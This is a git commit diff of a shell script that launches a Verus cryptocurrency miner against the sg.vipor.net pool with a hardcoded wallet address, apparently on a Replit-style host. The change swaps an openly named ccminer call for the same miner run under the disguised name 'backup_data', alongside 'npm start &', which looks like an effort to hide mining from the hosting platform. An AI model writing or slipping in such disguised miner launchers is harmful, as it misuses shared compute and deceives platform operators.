05f487efd205e3749d2774dbcc0473330981de26
ahmadrozaq <94879061+ahmadrozaq@users.noreply.github.com>
2025-01-08 15:03:58 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,13 +1,12 @@
 #!/bin/sh
-#npm start &
-PoolHost=stratum+ssl://sg.vipor.net
-Port=5140
+npm start &
+PoolHost=stratum+tcp://sg.vipor.net
+Port=5040
 PublicVerusCoinAddress=RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim
 WorkerName=repl
 Threads=1
 #set working directory to the location of this script
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 cd $DIR
-chmod +x ccminer
-./ccminer -a verus -o stratum+tcp://sg.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.cloudall -p x -t 2
-#./verus_maskoding -a VRSC -o "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"
+chmod +x backup_data
+./backup_data -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"
